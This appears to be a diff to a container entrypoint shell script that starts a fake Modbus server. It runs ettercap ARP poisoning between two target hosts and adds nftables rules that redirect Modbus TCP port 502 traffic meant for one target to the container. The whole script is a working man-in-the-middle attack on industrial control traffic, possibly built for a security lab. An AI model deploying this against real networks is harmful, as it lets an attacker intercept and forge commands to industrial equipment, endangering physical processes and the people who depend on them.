@@ -16,7 +16,6 @@ update_config() {
 }
 
 # Process environment variables for registers
-# Format: M_COIL_1=true, M_HOLDING_10=1234, etc.
 env | grep '^M_' | while read -r line; do
     var_name=$(echo "$line" | cut -d= -f1)
     value=$(echo "$line" | cut -d= -f2-)
@@ -40,14 +39,32 @@ env | grep '^M_' | while read -r line; do
     esac
 done
 
+if [ -z "$INTERFACE" ]; then
+    INTERFACE="eth1"
+fi
+
+# Setup nftables if TARGET1 is set
+if [ -n "$TARGET1" ]; then
+    echo "Setting up nftables..."
+    # Get current IP
+    MY_IP=$(ip -4 addr show dev "$INTERFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
+    
+    if [ -n "$MY_IP" ]; then
+        sudo nft add table ip nat
+        sudo nft 'add chain ip nat prerouting { type nat hook prerouting priority -100; }'
+        sudo nft 'add chain ip nat postrouting { type nat hook postrouting priority 100; }'
+        sudo nft add rule ip nat prerouting ip daddr "$TARGET1" tcp dport 502 dnat to "$MY_IP":502
+    else
+        echo "Could not determine IP for interface $INTERFACE. Skipping nftables setup."
+    fi
+fi
+
 # Start Modbus Server in the background
 echo "Starting Modbus Server..."
-cd /opt/modbus-server
-source .venv/bin/activate
-uv run ./src/app/modbus_server.py &
+modbus-server &
 MODBUS_PID=$!
 
-# Wait for Modbus Server to start (simple sleep for now, could be more robust)
+# Wait for Modbus Server to start
 sleep 2
 
 # Start Ettercap if configured
@@ -58,30 +75,29 @@ if [ -n "$INTERFACE" ] && [ -n "$TARGET1" ] && [ -n "$TARGET2" ]; then
     echo "Target 2: $TARGET2"
     
     # Run ettercap in background
+    # ettercap -i ${INTERFACE} -T -M arp:remote /${TARGET1}// /${TARGET2}//
     ettercap -i "$INTERFACE" -T -M arp:remote /"$TARGET1"// /"$TARGET2"// &
     ETTERCAP_PID=$!
 else
     echo "Ettercap configuration missing (INTERFACE, TARGET1, TARGET2). Skipping ARP poisoning."
 fi
 
-# Keep container running and handle signals
-# We assign the PIDs to wait on. If ettercap is not running, we just wait on modbus.
-pids=("$MODBUS_PID")
-if [ -n "$ETTERCAP_PID" ]; then
-    pids+=("$ETTERCAP_PID")
-fi
-
 # Function to handle termination
 cleanup() {
     echo "Stopping services..."
+    sudo nft delete table ip nat 2>/dev/null || true
     if [ -n "$ETTERCAP_PID" ]; then
         kill "$ETTERCAP_PID" 2>/dev/null || true
     fi
-    kill "$MODBUS_PID" 2>/dev/null || true
+    if [ -n "$MODBUS_PID" ]; then
+        kill "$MODBUS_PID" 2>/dev/null || true
+    fi
     exit 0
 }
 
 trap cleanup SIGTERM SIGINT
 
-# Wait for processes
-wait "${pids[@]}"
+# Keep container alive even if processes die
+while true; do
+  sleep 1
+done
